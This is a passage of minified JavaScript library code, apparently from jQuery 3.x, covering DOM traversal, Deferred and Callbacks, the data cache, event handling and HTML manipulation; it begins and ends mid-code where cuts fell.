            if (!n) return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2)
        })), r.attributes && se((function (e) {
            return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value")
        })) || oe("value", (function (e, t, n) {
            if (!n && "input" === e.nodeName.toLowerCase()) return e.defaultValue
        })), se((function (e) {
            return null == e.getAttribute("disabled")
        })) || oe(H, (function (e, t, n) {
            if (!n) return !0 === e[t] ? t.toLowerCase() : (t = e.getAttributeNode(t)) && t.specified ? t.value : null
        })), ie
    }(e);

    function x(e, t, n) {
        for (var i = [], r = void 0 !== n; (e = e[t]) && 9 !== e.nodeType;) if (1 === e.nodeType) {
            if (r && f(e).is(n)) break;
            i.push(e)
        }
        return i
    }

    function w(e, t) {
        for (var n = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && n.push(e);
        return n
    }

    f.find = b, f.expr = b.selectors, f.expr[":"] = f.expr.pseudos, f.uniqueSort = f.unique = b.uniqueSort, f.text = b.getText, f.isXMLDoc = b.isXML, f.contains = b.contains;
    var S = f.expr.match.needsContext, E = /^<([\w-]+)\s*\/?>(?:<\/\1>|)$/, C = /^.[^:#\[\.,]*$/;

    function T(e, t, n) {
        if (f.isFunction(t)) return f.grep(e, (function (e, i) {
            return !!t.call(e, i, e) !== n
        }));
        if (t.nodeType) return f.grep(e, (function (e) {
            return e === t !== n
        }));
        if ("string" == typeof t) {
            if (C.test(t)) return f.filter(t, e, n);
            t = f.filter(t, e)
        }
        return f.grep(e, (function (e) {
            return -1 < l.call(t, e) !== n
        }))
    }

    f.filter = function (e, t, n) {
        var i = t[0];
        return n && (e = ":not(" + e + ")"), 1 === t.length && 1 === i.nodeType ? f.find.matchesSelector(i, e) ? [i] : [] : f.find.matches(e, f.grep(t, (function (e) {
            return 1 === e.nodeType
        })))
    }, f.fn.extend({
        find: function (e) {
            var t, n = this.length, i = [], r = this;
            if ("string" != typeof e) return this.pushStack(f(e).filter((function () {
                for (t = 0; t < n; t++) if (f.contains(r[t], this)) return !0
            })));
            for (t = 0; t < n; t++) f.find(e, r[t], i);
            return (i = this.pushStack(1 < n ? f.unique(i) : i)).selector = this.selector ? this.selector + " " + e : e, i
        }, filter: function (e) {
            return this.pushStack(T(this, e || [], !1))
        }, not: function (e) {
            return this.pushStack(T(this, e || [], !0))
        }, is: function (e) {
            return !!T(this, "string" == typeof e && S.test(e) ? f(e) : e || [], !1).length
        }
    });
    var k = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/;
    (f.fn.init = function (e, t, n) {
        if (!e) return this;
        if (n = n || P, "string" != typeof e) return e.nodeType ? (this.context = this[0] = e, this.length = 1, this) : f.isFunction(e) ? void 0 !== n.ready ? n.ready(e) : e(f) : (void 0 !== e.selector && (this.selector = e.selector, this.context = e.context), f.makeArray(e, this));
        if (!(i = "<" === e[0] && ">" === e[e.length - 1] && 3 <= e.length ? [null, e, null] : k.exec(e)) || !i[1] && t) return (!t || t.jquery ? t || n : this.constructor(t)).find(e);
        if (i[1]) {
            if (t = t instanceof f ? t[0] : t, f.merge(this, f.parseHTML(i[1], t && t.nodeType ? t.ownerDocument || t : r, !0)), E.test(i[1]) && f.isPlainObject(t)) for (var i in t) f.isFunction(this[i]) ? this[i](t[i]) : this.attr(i, t[i]);
            return this
        }
        return (n = r.getElementById(i[2])) && n.parentNode && (this.length = 1, this[0] = n), this.context = r, this.selector = e, this
    }).prototype = f.fn;
    var P = f(r), M = /^(?:parents|prev(?:Until|All))/, L = {children: !0, contents: !0, next: !0, prev: !0};

    function I(e, t) {
        for (; (e = e[t]) && 1 !== e.nodeType;) ;
        return e
    }

    f.fn.extend({
        has: function (e) {
            var t = f(e, this), n = t.length;
            return this.filter((function () {
                for (var e = 0; e < n; e++) if (f.contains(this, t[e])) return !0
            }))
        }, closest: function (e, t) {
            for (var n, i = 0, r = this.length, a = [], s = S.test(e) || "string" != typeof e ? f(e, t || this.context) : 0; i < r; i++) for (n = this[i]; n && n !== t; n = n.parentNode) if (n.nodeType < 11 && (s ? -1 < s.index(n) : 1 === n.nodeType && f.find.matchesSelector(n, e))) {
                a.push(n);
                break
            }
            return this.pushStack(1 < a.length ? f.uniqueSort(a) : a)
        }, index: function (e) {
            return e ? "string" == typeof e ? l.call(f(e), this[0]) : l.call(this, e.jquery ? e[0] : e) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
        }, add: function (e, t) {
            return this.pushStack(f.uniqueSort(f.merge(this.get(), f(e, t))))
        }, addBack: function (e) {
            return this.add(null == e ? this.prevObject : this.prevObject.filter(e))
        }
    }), f.each({
        parent: function (e) {
            return (e = e.parentNode) && 11 !== e.nodeType ? e : null
        }, parents: function (e) {
            return x(e, "parentNode")
        }, parentsUntil: function (e, t, n) {
            return x(e, "parentNode", n)
        }, next: function (e) {
            return I(e, "nextSibling")
        }, prev: function (e) {
            return I(e, "previousSibling")
        }, nextAll: function (e) {
            return x(e, "nextSibling")
        }, prevAll: function (e) {
            return x(e, "previousSibling")
        }, nextUntil: function (e, t, n) {
            return x(e, "nextSibling", n)
        }, prevUntil: function (e, t, n) {
            return x(e, "previousSibling", n)
        }, siblings: function (e) {
            return w((e.parentNode || {}).firstChild, e)
        }, children: function (e) {
            return w(e.firstChild)
        }, contents: function (e) {
            return e.contentDocument || f.merge([], e.childNodes)
        }
    }, (function (e, t) {
        f.fn[e] = function (n, i) {
            var r = f.map(this, t, n);
            return (i = "Until" !== e.slice(-5) ? n : i) && "string" == typeof i && (r = f.filter(i, r)), 1 < this.length && (L[e] || f.uniqueSort(r), M.test(e) && r.reverse()), this.pushStack(r)
        }
    }));
    var A, D = /\S+/g;

    function N() {
        r.removeEventListener("DOMContentLoaded", N), e.removeEventListener("load", N), f.ready()
    }

    function $(e, t, n, i, r, a, s) {
        var o = 0, l = e.length, c = null == n;
        if ("object" === f.type(n)) for (o in r = !0, n) $(e, t, o, n[o], !0, a, s); else if (void 0 !== i && (r = !0, f.isFunction(i) || (s = !0), t = c ? s ? (t.call(e, i), null) : (c = t, function (e, t, n) {
            return c.call(f(e), n)
        }) : t)) for (; o < l; o++) t(e[o], n, s ? i : i.call(e[o], o, t(e[o], n)));
        return r ? e : c ? t.call(e) : l ? t(e[0], n) : a
    }

    function O(e) {
        return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType
    }

    function _() {
        this.expando = f.expando + _.uid++
    }

    f.Callbacks = function (e) {
        var t, n;

        function i() {
            for (o = e.once, s = r = !0; c.length; u = -1) for (a = c.shift(); ++u < l.length;) !1 === l[u].apply(a[0], a[1]) && e.stopOnFalse && (u = l.length, a = !1);
            e.memory || (a = !1), r = !1, o && (l = a ? [] : "")
        }

        e = "string" == typeof e ? (t = e, n = {}, f.each(t.match(D) || [], (function (e, t) {
            n[t] = !0
        })), n) : f.extend({}, e);
        var r, a, s, o, l = [], c = [], u = -1, d = {
            add: function () {
                return l && (a && !r && (u = l.length - 1, c.push(a)), function t(n) {
                    f.each(n, (function (n, i) {
                        f.isFunction(i) ? e.unique && d.has(i) || l.push(i) : i && i.length && "string" !== f.type(i) && t(i)
                    }))
                }(arguments), a && !r && i()), this
            }, remove: function () {
                return f.each(arguments, (function (e, t) {
                    for (var n; -1 < (n = f.inArray(t, l, n));) l.splice(n, 1), n <= u && u--
                })), this
            }, has: function (e) {
                return e ? -1 < f.inArray(e, l) : 0 < l.length
            }, empty: function () {
                return l = l && [], this
            }, disable: function () {
                return o = c = [], l = a = "", this
            }, disabled: function () {
                return !l
            }, lock: function () {
                return o = c = [], a || (l = a = ""), this
            }, locked: function () {
                return !!o
            }, fireWith: function (e, t) {
                return o || (t = [e, (t = t || []).slice ? t.slice() : t], c.push(t), r || i()), this
            }, fire: function () {
                return d.fireWith(this, arguments), this
            }, fired: function () {
                return !!s
            }
        };
        return d
    }, f.extend({
        Deferred: function (e) {
            var t = [["resolve", "done", f.Callbacks("once memory"), "resolved"], ["reject", "fail", f.Callbacks("once memory"), "rejected"], ["notify", "progress", f.Callbacks("memory")]],
                n = "pending", i = {
                    state: function () {
                        return n
                    }, always: function () {
                        return r.done(arguments).fail(arguments), this
                    }, then: function () {
                        var e = arguments;
                        return f.Deferred((function (n) {
                            f.each(t, (function (t, a) {
                                var s = f.isFunction(e[t]) && e[t];
                                r[a[1]]((function () {
                                    var e = s && s.apply(this, arguments);
                                    e && f.isFunction(e.promise) ? e.promise().progress(n.notify).done(n.resolve).fail(n.reject) : n[a[0] + "With"](this === i ? n.promise() : this, s ? [e] : arguments)
                                }))
                            })), e = null
                        })).promise()
                    }, promise: function (e) {
                        return null != e ? f.extend(e, i) : i
                    }
                }, r = {};
            return i.pipe = i.then, f.each(t, (function (e, a) {
                var s = a[2], o = a[3];
                i[a[1]] = s.add, o && s.add((function () {
                    n = o
                }), t[1 ^ e][2].disable, t[2][2].lock), r[a[0]] = function () {
                    return r[a[0] + "With"](this === r ? i : this, arguments), this
                }, r[a[0] + "With"] = s.fireWith
            })), i.promise(r), e && e.call(r, r), r
        }, when: function (e) {
            function t(e, t, i) {
                return function (r) {
                    t[e] = this, i[e] = 1 < arguments.length ? a.call(arguments) : r, i === n ? u.notifyWith(t, i) : --c || u.resolveWith(t, i)
                }
            }

            var n, i, r, s = 0, o = a.call(arguments), l = o.length,
                c = 1 !== l || e && f.isFunction(e.promise) ? l : 0, u = 1 === c ? e : f.Deferred();
            if (1 < l) for (n = new Array(l), i = new Array(l), r = new Array(l); s < l; s++) o[s] && f.isFunction(o[s].promise) ? o[s].promise().progress(t(s, i, n)).done(t(s, r, o)).fail(u.reject) : --c;
            return c || u.resolveWith(r, o), u.promise()
        }
    }), f.fn.ready = function (e) {
        return f.ready.promise().done(e), this
    }, f.extend({
        isReady: !1, readyWait: 1, holdReady: function (e) {
            e ? f.readyWait++ : f.ready(!0)
        }, ready: function (e) {
            (!0 === e ? --f.readyWait : f.isReady) || (f.isReady = !0) !== e && 0 < --f.readyWait || (A.resolveWith(r, [f]), f.fn.triggerHandler && (f(r).triggerHandler("ready"), f(r).off("ready")))
        }
    }), f.ready.promise = function (t) {
        return A || (A = f.Deferred(), "complete" === r.readyState || "loading" !== r.readyState && !r.documentElement.doScroll ? e.setTimeout(f.ready) : (r.addEventListener("DOMContentLoaded", N), e.addEventListener("load", N))), A.promise(t)
    }, f.ready.promise(), _.uid = 1, _.prototype = {
        register: function (e, t) {
            return t = t || {}, e.nodeType ? e[this.expando] = t : Object.defineProperty(e, this.expando, {
                value: t,
                writable: !0,
                configurable: !0
            }), e[this.expando]
        }, cache: function (e) {
            if (!O(e)) return {};
            var t = e[this.expando];
            return t || (t = {}, O(e) && (e.nodeType ? e[this.expando] = t : Object.defineProperty(e, this.expando, {
                value: t,
                configurable: !0
            }))), t
        }, set: function (e, t, n) {
            var i, r = this.cache(e);
            if ("string" == typeof t) r[t] = n; else for (i in t) r[i] = t[i];
            return r
        }, get: function (e, t) {
            return void 0 === t ? this.cache(e) : e[this.expando] && e[this.expando][t]
        }, access: function (e, t, n) {
            var i;
            return void 0 === t || t && "string" == typeof t && void 0 === n ? void 0 !== (i = this.get(e, t)) ? i : this.get(e, f.camelCase(t)) : (this.set(e, t, n), void 0 !== n ? n : t)
        }, remove: function (e, t) {
            var n, i, r, a = e[this.expando];
            if (void 0 !== a) {
                if (void 0 === t) this.register(e); else {
                    n = (i = f.isArray(t) ? t.concat(t.map(f.camelCase)) : (r = f.camelCase(t), t in a ? [t, r] : (i = r) in a ? [i] : i.match(D) || [])).length;
                    for (; n--;) delete a[i[n]]
                }
                void 0 !== t && !f.isEmptyObject(a) || (e.nodeType ? e[this.expando] = void 0 : delete e[this.expando])
            }
        }, hasData: function (e) {
            return void 0 !== (e = e[this.expando]) && !f.isEmptyObject(e)
        }
    };
    var H = new _, z = new _, B = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/, F = /[A-Z]/g;

    function R(e, t, n) {
        var i;
        if (void 0 === n && 1 === e.nodeType) if (i = "data-" + t.replace(F, "-$&").toLowerCase(), "string" == typeof (n = e.getAttribute(i))) {
            try {
                n = "true" === n || "false" !== n && ("null" === n ? null : +n + "" === n ? +n : B.test(n) ? f.parseJSON(n) : n)
            } catch (e) {
            }
            z.set(e, t, n)
        } else n = void 0;
        return n
    }

    function j(e, t) {
        return "none" === f.css(e = t || e, "display") || !f.contains(e.ownerDocument, e)
    }

    f.extend({
        hasData: function (e) {
            return z.hasData(e) || H.hasData(e)
        }, data: function (e, t, n) {
            return z.access(e, t, n)
        }, removeData: function (e, t) {
            z.remove(e, t)
        }, _data: function (e, t, n) {
            return H.access(e, t, n)
        }, _removeData: function (e, t) {
            H.remove(e, t)
        }
    }), f.fn.extend({
        data: function (e, t) {
            var n, i, r, a = this[0], s = a && a.attributes;
            if (void 0 !== e) return "object" == typeof e ? this.each((function () {
                z.set(this, e)
            })) : $(this, (function (t) {
                var n, i;
                return a && void 0 === t ? void 0 !== (n = z.get(a, e) || z.get(a, e.replace(F, "-$&").toLowerCase())) ? n : (i = f.camelCase(e), void 0 !== (n = z.get(a, i)) || void 0 !== (n = R(a, i, void 0)) ? n : void 0) : (i = f.camelCase(e), void this.each((function () {
                    var n = z.get(this, i);
                    z.set(this, i, t), -1 < e.indexOf("-") && void 0 !== n && z.set(this, e, t)
                })))
            }), null, t, 1 < arguments.length, null, !0);
            if (this.length && (r = z.get(a), 1 === a.nodeType && !H.get(a, "hasDataAttrs"))) {
                for (n = s.length; n--;) s[n] && 0 === (i = s[n].name).indexOf("data-") && (i = f.camelCase(i.slice(5)), R(a, i, r[i]));
                H.set(a, "hasDataAttrs", !0)
            }
            return r
        }, removeData: function (e) {
            return this.each((function () {
                z.remove(this, e)
            }))
        }
    }), f.extend({
        queue: function (e, t, n) {
            var i;
            if (e) return i = H.get(e, t = (t || "fx") + "queue"), n && (!i || f.isArray(n) ? i = H.access(e, t, f.makeArray(n)) : i.push(n)), i || []
        }, dequeue: function (e, t) {
            t = t || "fx";
            var n = f.queue(e, t), i = n.length, r = n.shift(), a = f._queueHooks(e, t);
            "inprogress" === r && (r = n.shift(), i--), r && ("fx" === t && n.unshift("inprogress"), delete a.stop, r.call(e, (function () {
                f.dequeue(e, t)
            }), a)), !i && a && a.empty.fire()
        }, _queueHooks: function (e, t) {
            var n = t + "queueHooks";
            return H.get(e, n) || H.access(e, n, {
                empty: f.Callbacks("once memory").add((function () {
                    H.remove(e, [t + "queue", n])
                }))
            })
        }
    }), f.fn.extend({
        queue: function (e, t) {
            var n = 2;
            return "string" != typeof e && (t = e, e = "fx", n--), arguments.length < n ? f.queue(this[0], e) : void 0 === t ? this : this.each((function () {
                var n = f.queue(this, e, t);
                f._queueHooks(this, e), "fx" === e && "inprogress" !== n[0] && f.dequeue(this, e)
            }))
        }, dequeue: function (e) {
            return this.each((function () {
                f.dequeue(this, e)
            }))
        }, clearQueue: function (e) {
            return this.queue(e || "fx", [])
        }, promise: function (e, t) {
            function n() {
                --r || a.resolveWith(s, [s])
            }

            var i, r = 1, a = f.Deferred(), s = this, o = this.length;
            for ("string" != typeof e && (t = e, e = void 0), e = e || "fx"; o--;) (i = H.get(s[o], e + "queueHooks")) && i.empty && (r++, i.empty.add(n));
            return n(), a.promise(t)
        }
    });
    h = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source;
    var q = new RegExp("^(?:([+-])=|)(" + h + ")([a-z%]*)$", "i"), V = ["Top", "Right", "Bottom", "Left"];

    function G(e, t, n, i) {
        var r, a = 1, s = 20, o = i ? function () {
                return i.cur()
            } : function () {
                return f.css(e, t, "")
            }, l = o(), c = n && n[3] || (f.cssNumber[t] ? "" : "px"),
            u = (f.cssNumber[t] || "px" !== c && +l) && q.exec(f.css(e, t));
        if (u && u[3] !== c) for (c = c || u[3], n = n || [], u = +l || 1; u /= a = a || ".5", f.style(e, t, u + c), a !== (a = o() / l) && 1 !== a && --s;) ;
        return n && (u = +u || +l || 0, r = n[1] ? u + (n[1] + 1) * n[2] : +n[2], i && (i.unit = c, i.start = u, i.end = r)), r
    }

    var X = /^(?:checkbox|radio)$/i, W = /<([\w:-]+)/, Y = /^$|\/(?:java|ecma)script/i, U = {
        option: [1, "<select multiple='multiple'>", "</select>"],
        thead: [1, "<table>", "</table>"],
        col: [2, "<table><colgroup>", "</colgroup></table>"],
        tr: [2, "<table><tbody>", "</tbody></table>"],
        td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
        _default: [0, "", ""]
    };

    function K(e, t) {
        var n = void 0 !== e.getElementsByTagName ? e.getElementsByTagName(t || "*") : void 0 !== e.querySelectorAll ? e.querySelectorAll(t || "*") : [];
        return void 0 === t || t && f.nodeName(e, t) ? f.merge([e], n) : n
    }

    function Q(e, t) {
        for (var n = 0, i = e.length; n < i; n++) H.set(e[n], "globalEval", !t || H.get(t[n], "globalEval"))
    }

    U.optgroup = U.option, U.tbody = U.tfoot = U.colgroup = U.caption = U.thead, U.th = U.td;
    var J = /<|&#?\w+;/;

    function Z(e, t, n, i, r) {
        for (var a, s, o, l, c, u = t.createDocumentFragment(), d = [], p = 0, h = e.length; p < h; p++) if ((a = e[p]) || 0 === a) if ("object" === f.type(a)) f.merge(d, a.nodeType ? [a] : a); else if (J.test(a)) {
            for (s = s || u.appendChild(t.createElement("div")), o = (W.exec(a) || ["", ""])[1].toLowerCase(), o = U[o] || U._default, s.innerHTML = o[1] + f.htmlPrefilter(a) + o[2], c = o[0]; c--;) s = s.lastChild;
            f.merge(d, s.childNodes), (s = u.firstChild).textContent = ""
        } else d.push(t.createTextNode(a));
        for (u.textContent = "", p = 0; a = d[p++];) if (i && -1 < f.inArray(a, i)) r && r.push(a); else if (l = f.contains(a.ownerDocument, a), s = K(u.appendChild(a), "script"), l && Q(s), n) for (c = 0; a = s[c++];) Y.test(a.type || "") && n.push(a);
        return u
    }

    i = r.createDocumentFragment().appendChild(r.createElement("div")), (b = r.createElement("input")).setAttribute("type", "radio"), b.setAttribute("checked", "checked"), b.setAttribute("name", "t"), i.appendChild(b), p.checkClone = i.cloneNode(!0).cloneNode(!0).lastChild.checked, i.innerHTML = "<textarea>x</textarea>", p.noCloneChecked = !!i.cloneNode(!0).lastChild.defaultValue;
    var ee = /^key/, te = /^(?:mouse|pointer|contextmenu|drag|drop)|click/, ne = /^([^.]*)(?:\.(.+)|)/;

    function ie() {
        return !0
    }

    function re() {
        return !1
    }

    function ae() {
        try {
            return r.activeElement
        } catch (e) {
        }
    }

    function se(e, t, n, i, r, a) {
        var s, o;
        if ("object" == typeof t) {
            for (o in "string" != typeof n && (i = i || n, n = void 0), t) se(e, o, n, i, t[o], a);
            return e
        }
        if (null == i && null == r ? (r = n, i = n = void 0) : null == r && ("string" == typeof n ? (r = i, i = void 0) : (r = i, i = n, n = void 0)), !1 === r) r = re; else if (!r) return e;
        return 1 === a && (s = r, (r = function (e) {
            return f().off(e), s.apply(this, arguments)
        }).guid = s.guid || (s.guid = f.guid++)), e.each((function () {
            f.event.add(this, t, r, i, n)
        }))
    }

    f.event = {
        global: {},
        add: function (e, t, n, i, r) {
            var a, s, o, l, c, u, d, p, h, m = H.get(e);
            if (m) for (n.handler && (n = (a = n).handler, r = a.selector), n.guid || (n.guid = f.guid++), (o = m.events) || (o = m.events = {}), (s = m.handle) || (s = m.handle = function (t) {
                return void 0 !== f && f.event.triggered !== t.type ? f.event.dispatch.apply(e, arguments) : void 0
            }), l = (t = (t || "").match(D) || [""]).length; l--;) d = h = (c = ne.exec(t[l]) || [])[1], p = (c[2] || "").split(".").sort(), d && (u = f.event.special[d] || {}, d = (r ? u.delegateType : u.bindType) || d, u = f.event.special[d] || {}, c = f.extend({
                type: d,
                origType: h,
                data: i,
                handler: n,
                guid: n.guid,
                selector: r,
                needsContext: r && f.expr.match.needsContext.test(r),
                namespace: p.join(".")
            }, a), (h = o[d]) || ((h = o[d] = []).delegateCount = 0, u.setup && !1 !== u.setup.call(e, i, p, s) || e.addEventListener && e.addEventListener(d, s)), u.add && (u.add.call(e, c), c.handler.guid || (c.handler.guid = n.guid)), r ? h.splice(h.delegateCount++, 0, c) : h.push(c), f.event.global[d] = !0)
        },
        remove: function (e, t, n, i, r) {
            var a, s, o, l, c, u, d, p, h, m, v, g = H.hasData(e) && H.get(e);
            if (g && (l = g.events)) {
                for (c = (t = (t || "").match(D) || [""]).length; c--;) if (h = v = (o = ne.exec(t[c]) || [])[1], m = (o[2] || "").split(".").sort(), h) {
                    for (d = f.event.special[h] || {}, p = l[h = (i ? d.delegateType : d.bindType) || h] || [], o = o[2] && new RegExp("(^|\\.)" + m.join("\\.(?:.*\\.|)") + "(\\.|$)"), s = a = p.length; a--;) u = p[a], !r && v !== u.origType || n && n.guid !== u.guid || o && !o.test(u.namespace) || i && i !== u.selector && ("**" !== i || !u.selector) || (p.splice(a, 1), u.selector && p.delegateCount--, d.remove && d.remove.call(e, u));
                    s && !p.length && (d.teardown && !1 !== d.teardown.call(e, m, g.handle) || f.removeEvent(e, h, g.handle), delete l[h])
                } else for (h in l) f.event.remove(e, h + t[c], n, i, !0);
                f.isEmptyObject(l) && H.remove(e, "handle events")
            }
        },
        dispatch: function (e) {
            e = f.event.fix(e);
            var t, n, i, r, s, o = a.call(arguments), l = (H.get(this, "events") || {})[e.type] || [],
                c = f.event.special[e.type] || {};
            if ((o[0] = e).delegateTarget = this, !c.preDispatch || !1 !== c.preDispatch.call(this, e)) {
                for (s = f.event.handlers.call(this, e, l), t = 0; (i = s[t++]) && !e.isPropagationStopped();) for (e.currentTarget = i.elem, n = 0; (r = i.handlers[n++]) && !e.isImmediatePropagationStopped();) e.rnamespace && !e.rnamespace.test(r.namespace) || (e.handleObj = r, e.data = r.data, void 0 !== (r = ((f.event.special[r.origType] || {}).handle || r.handler).apply(i.elem, o)) && !1 === (e.result = r) && (e.preventDefault(), e.stopPropagation()));
                return c.postDispatch && c.postDispatch.call(this, e), e.result
            }
        },
        handlers: function (e, t) {
            var n, i, r, a, s = [], o = t.delegateCount, l = e.target;
            if (o && l.nodeType && ("click" !== e.type || isNaN(e.button) || e.button < 1)) for (; l !== this; l = l.parentNode || this) if (1 === l.nodeType && (!0 !== l.disabled || "click" !== e.type)) {
                for (i = [], n = 0; n < o; n++) void 0 === i[r = (a = t[n]).selector + " "] && (i[r] = a.needsContext ? -1 < f(r, this).index(l) : f.find(r, this, null, [l]).length), i[r] && i.push(a);
                i.length && s.push({elem: l, handlers: i})
            }
            return o < t.length && s.push({elem: this, handlers: t.slice(o)}), s
        },
        props: "altKey bubbles cancelable ctrlKey currentTarget detail eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
        fixHooks: {},
        keyHooks: {
            props: "char charCode key keyCode".split(" "), filter: function (e, t) {
                return null == e.which && (e.which = null != t.charCode ? t.charCode : t.keyCode), e
            }
        },
        mouseHooks: {
            props: "button buttons clientX clientY offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
            filter: function (e, t) {
                var n, i, a = t.button;
                return null == e.pageX && null != t.clientX && (n = (i = e.target.ownerDocument || r).documentElement, i = i.body, e.pageX = t.clientX + (n && n.scrollLeft || i && i.scrollLeft || 0) - (n && n.clientLeft || i && i.clientLeft || 0), e.pageY = t.clientY + (n && n.scrollTop || i && i.scrollTop || 0) - (n && n.clientTop || i && i.clientTop || 0)), e.which || void 0 === a || (e.which = 1 & a ? 1 : 2 & a ? 3 : 4 & a ? 2 : 0), e
            }
        },
        fix: function (e) {
            if (e[f.expando]) return e;
            var t, n, i, a = e.type, s = e, o = this.fixHooks[a];
            for (o || (this.fixHooks[a] = o = te.test(a) ? this.mouseHooks : ee.test(a) ? this.keyHooks : {}), i = o.props ? this.props.concat(o.props) : this.props, e = new f.Event(s), t = i.length; t--;) e[n = i[t]] = s[n];
            return e.target || (e.target = r), 3 === e.target.nodeType && (e.target = e.target.parentNode), o.filter ? o.filter(e, s) : e
        },
        special: {
            load: {noBubble: !0}, focus: {
                trigger: function () {
                    if (this !== ae() && this.focus) return this.focus(), !1
                }, delegateType: "focusin"
            }, blur: {
                trigger: function () {
                    if (this === ae() && this.blur) return this.blur(), !1
                }, delegateType: "focusout"
            }, click: {
                trigger: function () {
                    if ("checkbox" === this.type && this.click && f.nodeName(this, "input")) return this.click(), !1
                }, _default: function (e) {
                    return f.nodeName(e.target, "a")
                }
            }, beforeunload: {
                postDispatch: function (e) {
                    void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result)
                }
            }
        }
    }, f.removeEvent = function (e, t, n) {
        e.removeEventListener && e.removeEventListener(t, n)
    }, f.Event = function (e, t) {
        if (!(this instanceof f.Event)) return new f.Event(e, t);
        e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? ie : re) : this.type = e, t && f.extend(this, t), this.timeStamp = e && e.timeStamp || f.now(), this[f.expando] = !0
    }, f.Event.prototype = {
        constructor: f.Event,
        isDefaultPrevented: re,
        isPropagationStopped: re,
        isImmediatePropagationStopped: re,
        isSimulated: !1,
        preventDefault: function () {
            var e = this.originalEvent;
            this.isDefaultPrevented = ie, e && !this.isSimulated && e.preventDefault()
        },
        stopPropagation: function () {
            var e = this.originalEvent;
            this.isPropagationStopped = ie, e && !this.isSimulated && e.stopPropagation()
        },
        stopImmediatePropagation: function () {
            var e = this.originalEvent;
            this.isImmediatePropagationStopped = ie, e && !this.isSimulated && e.stopImmediatePropagation(), this.stopPropagation()
        }
    }, f.each({
        mouseenter: "mouseover",
        mouseleave: "mouseout",
        pointerenter: "pointerover",
        pointerleave: "pointerout"
    }, (function (e, t) {
        f.event.special[e] = {
            delegateType: t, bindType: t, handle: function (e) {
                var n, i = e.relatedTarget, r = e.handleObj;
                return i && (i === this || f.contains(this, i)) || (e.type = r.origType, n = r.handler.apply(this, arguments), e.type = t), n
            }
        }
    })), f.fn.extend({
        on: function (e, t, n, i) {
            return se(this, e, t, n, i)
        }, one: function (e, t, n, i) {
            return se(this, e, t, n, i, 1)
        }, off: function (e, t, n) {
            var i, r;
            if (e && e.preventDefault && e.handleObj) return i = e.handleObj, f(e.delegateTarget).off(i.namespace ? i.origType + "." + i.namespace : i.origType, i.selector, i.handler), this;
            if ("object" != typeof e) return !1 !== t && "function" != typeof t || (n = t, t = void 0), !1 === n && (n = re), this.each((function () {
                f.event.remove(this, e, n, t)
            }));
            for (r in e) this.off(r, t, e[r]);
            return this
        }
    });
    var oe = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi, le = /<script|<style|<link/i,
        ce = /checked\s*(?:[^=]|=\s*.checked.)/i, ue = /^true\/(.*)/, de = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;

    function pe(e, t) {
        return f.nodeName(e, "table") && f.nodeName(11 !== t.nodeType ? t : t.firstChild, "tr") ? e.getElementsByTagName("tbody")[0] || e.appendChild(e.ownerDocument.createElement("tbody")) : e
    }

    function he(e) {
        return e.type = (null !== e.getAttribute("type")) + "/" + e.type, e
    }

    function fe(e) {
        var t = ue.exec(e.type);
        return t ? e.type = t[1] : e.removeAttribute("type"), e
    }

    function me(e, t) {
        var n, i, r, a, s, o;
        if (1 === t.nodeType) {
            if (H.hasData(e) && (a = H.access(e), s = H.set(t, a), o = a.events)) for (r in delete s.handle, s.events = {}, o) for (n = 0, i = o[r].length; n < i; n++) f.event.add(t, r, o[r][n]);
            z.hasData(e) && (e = z.access(e), e = f.extend({}, e), z.set(t, e))
        }
    }

    function ve(e, t, n, i) {
        t = s.apply([], t);
        var r, a, o, l, c, u, d = 0, h = e.length, m = h - 1, v = t[0], g = f.isFunction(v);
        if (g || 1 < h && "string" == typeof v && !p.checkClone && ce.test(v)) return e.each((function (r) {
            var a = e.eq(r);
            g && (t[0] = v.call(this, r, a.html())), ve(a, t, n, i)
        }));
        if (h && (a = (r = Z(t, e[0].ownerDocument, !1, e, i)).firstChild, 1 === r.childNodes.length && (r = a), a || i)) {
            for (l = (o = f.map(K(r, "script"), he)).length; d < h; d++) c = r, d !== m && (c = f.clone(c, !0, !0), l && f.merge(o, K(c, "script"))), n.call(e[d], c, d);
            if (l) for (u = o[o.length - 1].ownerDocument, f.map(o, fe), d = 0; d < l; d++) c = o[d], Y.test(c.type || "") && !H.access(c, "globalEval") && f.contains(u, c) && (c.src ? f._evalUrl && f._evalUrl(c.src) : f.globalEval(c.textContent.replace(de, "")))
        }
        return e
    }

    function ge(e, t, n) {
        for (var i, r = t ? f.filter(t, e) : e, a = 0; null != (i = r[a]); a++) n || 1 !== i.nodeType || f.cleanData(K(i)), i.parentNode && (n && f.contains(i.ownerDocument, i) && Q(K(i, "script")), i.parentNode.removeChild(i));
        return e
    }

    f.extend({
        htmlPrefilter: function (e) {
            return e.replace(oe, "<$1></$2>")
        }, clone: function (e, t, n) {
            var i, r, a, s, o, l, c, u = e.cloneNode(!0), d = f.contains(e.ownerDocument, e);
            if (!(p.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || f.isXMLDoc(e))) for (s = K(u), i = 0, r = (a = K(e)).length; i < r; i++) o = a[i], void 0, "input" === (c = (l = s[i]).nodeName.toLowerCase()) && X.test(o.type) ? l.checked = o.checked : "input" !== c && "textarea" !== c || (l.defaultValue = o.defaultValue);
            if (t) if (n) for (a = a || K(e), s = s || K(u), i = 0, r = a.length; i < r; i++) me(a[i], s[i]); else me(e, u);
            return 0 < (s = K(u, "script")).length && Q(s, !d && K(e, "script")), u
        }, cleanData: function (e) {
            for (var t, n, i, r = f.event.special, a = 0; void 0 !== (n = e[a]); a++) if (O(n)) {
                if (t = n[H.expando]) {
